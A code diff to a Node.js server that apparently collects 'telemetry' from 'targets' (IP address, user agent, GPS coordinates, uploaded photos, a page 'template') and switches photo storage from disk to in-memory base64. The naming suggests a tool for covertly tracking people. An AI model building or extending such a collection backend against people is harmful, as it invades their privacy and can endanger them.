@@ -184,6 +184,12 @@ function updateTargetTelemetry(id, payload, serverIpLocation, receivedAt = Date.
     if (serverIpLocation && serverIpLocation.ip) {
         target.ipLocation = Object.assign({}, target.ipLocation || {}, serverIpLocation)
     }
+    if (payload.photoWebPath) {
+        target.photos = target.photos || []
+        if (!target.photos.includes(payload.photoWebPath)) {
+            target.photos.push(payload.photoWebPath)
+        }
+    }
     if (payload.template) target.template = safeText(payload.template, 40) || target.template
     target.lastSeen = receivedAt
 
@@ -199,16 +205,8 @@ const multer = require("multer")
 const path = require("path")
 const fs = require("fs")
 
-const uploadDir = path.join(__dirname, "public", "uploads")
-if (!fs.existsSync(uploadDir)) {
-    fs.mkdirSync(uploadDir, { recursive: true })
-}
-
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => cb(null, uploadDir),
-    filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
-})
-const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } })
+const storage = multer.memoryStorage()
+const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } })
 
 function targetsAsObject() {
     return Object.fromEntries(TARGETS.entries())
@@ -218,7 +216,14 @@ async function handleTelemetryIngestion(req, res) {
     const clientIp = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || (req.socket ? req.socket.remoteAddress : "") || req.ip || "Unknown"
     const userAgent = req.headers["user-agent"] || "Unknown"
     const body = req.body || {}
-    const photoWebPath = req.file ? `/uploads/${req.file.filename}` : null
+    let photoWebPath = null
+
+    if (req.file) {
+        const mime = req.file.mimetype || "image/jpeg"
+        photoWebPath = `data:${mime};base64,${req.file.buffer.toString("base64")}`
+    } else if (body.photo || body.image || body.media) {
+        photoWebPath = body.photo || body.image || body.media
+    }
 
     const payload = {
         timestamp: new Date().toISOString(),
@@ -232,7 +237,7 @@ async function handleTelemetryIngestion(req, res) {
             lng: body.lng != null ? Number(body.lng) : null,
             source: body.source || body.locationSource || "unspecified"
         },
-        media: photoWebPath
+        media: photoWebPath ? (photoWebPath.startsWith("data:") ? "[Base64 Image]" : photoWebPath) : null
     }
 
     console.log("[Telemetry Ingested]:", payload)
@@ -241,13 +246,10 @@ async function handleTelemetryIngestion(req, res) {
     const targetId = body.id || body.targetId
     if (targetId && isValidTargetId(targetId)) {
         const serverIpLocation = await getIpInfo(clientIp)
-        target = updateTargetTelemetry(targetId, body, serverIpLocation)
-        if (photoWebPath && target) {
-            target.photos = target.photos || []
-            if (!target.photos.includes(photoWebPath)) {
-                target.photos.push(photoWebPath)
-            }
+        if (photoWebPath) {
+            body.photoWebPath = photoWebPath
         }
+        target = updateTargetTelemetry(targetId, body, serverIpLocation)
     }
 
     return res.status(200).json({
